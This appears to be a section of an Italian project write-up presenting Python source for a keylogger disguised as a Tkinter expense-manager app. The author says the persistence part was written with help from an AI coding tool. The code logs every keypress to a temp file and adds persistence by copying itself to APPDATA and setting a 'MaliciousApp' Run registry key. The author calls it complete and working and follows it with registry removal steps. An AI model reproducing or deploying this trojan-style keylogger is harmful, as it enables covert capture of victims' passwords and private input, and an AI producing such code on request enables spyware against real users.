## Modifiche al keylogger

Questa parte del codice permette di ottenere persistence contro il riavvio o lo spegnimento del computer, l'ho programmata con l'aiuto di BlackBox AI [[10]](https://www.blackbox.ai/). 

Questo codice è completo di Interfaccia utente, Keylogger e Persistence. E' funzionante:

```python
import os
import shutil
import sys
from datetime import datetime, date
import tkinter as tk
from tkinter import ttk
import pynput
from pynput.keyboard import Key, Listener
import winreg as reg

# Funzione per aggiungere la persistenza
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    
    # Copia il file nella directory persistente
    persistent_path = os.path.join(os.environ["APPDATA"], "malware.exe")
    shutil.copyfile(file_path, persistent_path)
    
    # Crea una chiave di registro per avviare il malware all'avvio
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key_name = "MaliciousApp"
    
    with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as open_key:
        reg.SetValueEx(open_key, key_name, 0, reg.REG_SZ, persistent_path)

# Classe KeyLogger
class KeyLogger:
    def __init__(self, log_directory=r"C:\windows\temp", log_file_name="log.txt"):
        self.log_directory = log_directory or os.path.join(os.path.expanduser("~"), "logs")
        self.log_file_name = log_file_name
        self.log_file_path = os.path.join(self.log_directory, self.log_file_name)
        
        # Crea la directory dei log se non esiste
        os.makedirs(self.log_directory, exist_ok=True)

    def log(self, message):
        with open(self.log_file_path, "a") as f:
            f.write(message)

    def on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            char = str(key)
        
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"{timestamp} - Pressed: {char}\n"
        self.log(log_message)
        print(log_message, end='')

    def on_release(self, key):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_message = f"{timestamp} - Released: {key}\n"
        self.log(log_message)
        print(log_message, end='')
        
        if key == Key.esc:
            return False

    def start(self):
        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

# Funzioni per la gestione delle transazioni
def add_transaction():
    amount = float(entry_amount.get())
    description = entry_description.get()
    category = "Uscite" if var_category.get() == 0 else "Entrate"
    transactions.append((date.today(), amount, description, category))
    update_table()
    clear_entry()

def update_table():
    tree.delete(*tree.get_children())
    for transaction in transactions:
        tree.insert("", "end", values=transaction)

def clear_entry():
    entry_amount.delete(0, "end")
    entry_description.delete(0, "end")
    var_category.set(0)

# Setup della GUI per la gestione delle spese
window = tk.Tk()
window.title("Manager Spese")
window.grid_rowconfigure(0, weight=1)
window.grid_columnconfigure(0, weight=1)

label_amount = tk.Label(window, text="Ammontare:")
label_amount.grid(row=0, column=0, padx=(10, 2), pady=5)
entry_amount = tk.Entry(window)
entry_amount.grid(row=0, column=1, padx=(2, 10), pady=5)

label_description = tk.Label(window, text="Descrizione:")
label_description.grid(row=1, column=0, padx=(10, 2), pady=5)
entry_description = tk.Entry(window)
entry_description.grid(row=1, column=1, padx=(2, 10), pady=5)

var_category = tk.IntVar()
radio_expense = tk.Radiobutton(window, text="Uscite", variable=var_category, value=0)
radio_expense.grid(row=2, column=0, padx=(10, 2), pady=5)
radio_income = tk.Radiobutton(window, text="Entrate", variable=var_category, value=1)
radio_income.grid(row=2, column=1, padx=(2, 10), pady=5)

button_add = tk.Button(window, text="Aggiungi Transazione", command=add_transaction)
button_add.grid(row=4, column=0, columnspan=2, pady=10)

tree = ttk.Treeview(window, columns=("data", "ammontare", "descrizione", "categoria"))
tree.heading("#0", text="Date")
tree.heading("ammontare", text="Ammontare")
tree.heading("descrizione", text="Descrizione")
tree.heading("categoria", text="Categoria")
tree.grid(row=5, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")

transactions = []
update_table()

# Avvio dell'interfaccia grafica
window.after(1, lambda: keylogger.start())
window.mainloop()

# Avvio del keylogger e aggiunta della persistenza
if __name__ == "__main__":
    keylogger = KeyLogger()
    add_to_startup(sys.argv[0])
    keylogger.start()

```

Dopo aver eseguito lo script e se si desidera rimuovere la chiave dal registro bisogna accedere alla utility regedit dal prompt dei comandi con l'identità dell'amministratore, selezionare il seguente percorso: "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", e cancellare la chiave "MaliciousApp" (definita nel codice soprastante).

